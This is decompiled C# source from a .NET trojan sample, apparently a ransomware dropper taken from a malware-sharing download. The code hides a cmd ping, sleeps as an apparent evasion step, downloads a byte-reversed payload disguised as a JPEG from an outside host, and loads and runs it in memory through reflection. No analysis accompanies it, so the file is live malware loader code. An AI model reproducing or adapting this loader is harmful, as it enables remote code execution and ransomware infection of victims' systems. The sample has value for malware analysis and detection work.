// Decompiled with JetBrains decompiler
// Type: Rohoq.Internet
// Assembly: Gwvejb, Version=18.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B4F9001-04CA-407A-9F31-A944706E218C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d94e491d1b53fb257442927b2c5ec94d2bf62c37856a7bfc56d7b60da5f1831f.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Rohoq
{
  internal class Internet
  {
    internal static void Config()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/c ping yahoo.com",
        WindowStyle = ProcessWindowStyle.Hidden
      });
      Thread.Sleep(TimeSpan.FromSeconds(20.0));
    }

    internal static void App()
    {
      AppDomain target = (AppDomain) typeof (AppDomain).GetProperty("CurrentDomain").GetValue((object) null, (object[]) null);
      Assembly assembly = (Assembly) target.GetType().InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) target, new object[1]
      {
        (object) Internet.Png
      });
    }

    internal static byte[] Png
    {
      get
      {
        byte[] png = new BinaryReader(WebRequest.Create("https://kotadiainc.com/Gwvejb.jpg").GetResponse().GetResponseStream()).ReadBytes(87611933);
        typeof (Array).GetMethod("Reverse", new Type[1]
        {
          typeof (Array)
        }).Invoke((object) null, new object[1]
        {
          (object) png
        });
        return png;
      }
    }

    internal static bool Info()
    {
      foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
      {
        foreach (Type type in assembly.GetTypes())
        {
          foreach (MethodInfo method in type.GetMethods())
          {
            if (method.Name == "Gnyjplroqtrrfgru")
              return (bool) method.Invoke((object) null, (object[]) null);
          }
        }
      }
      return false;
    }
  }
}
